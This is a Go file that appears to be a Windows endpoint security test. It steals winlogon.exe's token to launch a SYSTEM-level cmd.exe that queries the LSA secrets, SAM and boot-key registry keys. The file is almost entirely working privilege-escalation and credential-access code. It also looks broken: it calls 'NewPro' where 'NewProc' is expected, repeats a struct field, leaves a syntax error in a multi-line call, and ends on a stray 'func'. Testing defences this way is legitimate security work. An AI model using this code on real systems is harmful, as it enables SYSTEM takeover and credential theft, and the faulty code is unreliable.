//go:build windows
// +build windows

/*
ID: c5ee8453-bc89-42e7-a414-1ba4bec85119
NAME: Suspicious Access to LSA Secrets Registry
CREATED: 2024-07-01
scenario(s):
Suspicious Access to LSA Secrets Registry
Security Account Manager (SAM) Registry Access
Privilege Escalation via EXTENDED STARTUPINFO
Potential Privilege Escalation via Token Impersonation
*/

package main

import (
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	Endpoint "github.com/preludeorg/test/endpoint"
	"golang.org/x/sys/windows"
)

func main() {
	Endpoint.Say("[+] Starting Suspicious Access to LSA Secrets Registry VST")
	Endpoint.Start(test, cleanup)
}

func test() {
	executeCommand := func(command string) {
		if !Endpoint.IsAvailable("cmd.exe") {
			Endpoint.Say("command execution not available")
			Endpoint.Stop(126) // PROTECTED
		}

		cmd := exec.Command("cmd.exe", "/C", command)
		// sets `SysProcAttr` to hide command window
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, err := cmd.CombinedOutput()
		if err != nil {
			Endpoint.Say(fmt.Sprintf("failed to execute command: %s", string(out)))
			Endpoint.Stop(1) // ERROR
		}

		Endpoint.Say(fmt.Sprintf("successfully executed command: %s", command))
		if strings.Contains(string(out), "Access Denied") {
			Endpoint.Say("process execution blocked")
			Endpoint.Stop(126) // PROTECTED
		}
	}

	// constants + types
	const (
		PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
		TOKEN_IMPERSONATE = 0x00000004
		TOKEN_DUPLICATE = 0x00000002
		SECURITY_IMPERSONATION = 0x2
		TOKEN_PRIMARY = 0x1
		LOGON_WITH_PROFILE = 0x1
		TOKEN_ALL_ACCESS = 0xf01ff
	)

	// import `CreateProcessWithTokenW` func from `advapi32.dll`
	var (
		modadvapi32 = windows.NewLazySystemDLL("advapi32.dll")
		procCreateProcessWithTokenW = modadvapi32.NewPro("CreateProcessWithTokenW")
	)

	// these structs are used for process creation
	type PROCESS_INFORMATION struct {
		hProcess windows.Handle
		hThread windows.Handle
		dwProcessId uint32
		dwThreadId uint32
	}

	type STARTUPINFO struct {
		cb uint32
		lpReserved *uint16
		lpDesktop *uint16
		lpTitle *uint16
		dwX uint32
		dwY uint32
		dwXSize uint32
		dwYSize uint32
		dwXCountChars uint32
		dwYCountChars uint32
		dwFillAttribute uint32
		dwFlags uint32
		wShowWindow uint16
		cbReserved uint16
		lpReserved *byte
		hStdInput windows.Handle
		hStdOutput windows.Handle
		hStdError windows.Handle
	}

	// retrieves PID of `winlogon.exe` [parent process]
	pid, _ := Endpoint.GetPID("winlogon.exe")
	// opens `winlogon.exe` proc with limitied info access rights
	hProcess, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
	if err != nil {
		Endpoint.Say("failed to open winlogon process")
		Endpoint.Stop(1)
	}

	/* 
	open process token + duplicate token
	*/
	
	var hSystemToken windows.Token
	// opens proc token of `winlogon.exe` with duplicate + impersonate access rights
	err = windows.OpenProcessToken(hProcess, TOKEN_DUPLICATE|TOKEN_IMPERSONATE, &hSystemToken)
	if err != nil {
		Endpoint.Say("failed to open proc token")
		Endpoint.Stop(1) // ERROR
	}
	// close handle
	defer windows.CloseHandle(windows.Handle(hSystemToken))

	var hSystemTokenDup windows.Token
	// duplicates opened token to create new token with all access rights, impersonation level, primary token type
	err = windows.DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, nil, SECURITY_IMPERSONATION, TOKEN_PRIMARY, &hSystemTokenDup)
	if err != nil {
		Endpoint.Say("failed to duplicate token")
		Endpoint.Stop(1) // ERROR
	}
	// close handle
	defer windows.CloseHandle(windows.Handle(hSystemTokenDup))

	/*
	create process with duplicated token
	*/

	// command to query sensitive reg keys
	cmdline := " /c reg.exe query hklm\\security\\policy\\secrets && reg.exe query hklm\\SAM\\SAM\\Domains\\Account && reg.exe query hklm\\SYSTEM\\ControlSet001\\Control\\Lsa\\JD && reg.exe query hklm\\SYSTEM\\ControlSet001\\Control\\Lsa\\Skew1"

	// init `STARTUPINFO` + `PROCESS_INFORMATION` structs
	startupInfo := STARTUPINFO{cb: uint32(unsafe.Sizeof(STARTUPINFO{}))}
	processInfo := PROCESS_INFORMATION{}

	// convert cmdline + app name to utf-16 pointers
	commandLine, _ := windows.UTF16PtrFromString(cmdline)
	appName, _ := windows.UTF16PtrFromString("C:\\Windows\\System32\\cmd.exe")

	// call `CreateProcessWithTokenW` to create new proc with duplicated token
	// run `cmd.exe` with the reg query commands
	ret, _, _ := procCreateProcessWithTokenW.Call(
		uintptr(hSystemTokenDup),
		uintptr(LOGON_WITH_PROFILE),
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(commandLine)),
		uintptr(0),
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&startupInfo)),
		uintptr(unsafe.Pointer(&processInfo))
	)

	// if ret = 0, proc creation failed
	if ret == 0 {
		Endpoint.Say("failed to execute command with duplicated token")
		Endpoint.Stop(1) // ERROR
	}

	Endpoint.Say("successfully executed command with duplicated token")

	// close handles
	windows.CloseHandle(processInfo.hProcess)
	windows.CloseHandle(processInfo.hThread)

	Endpoint.Stop(100)

}

func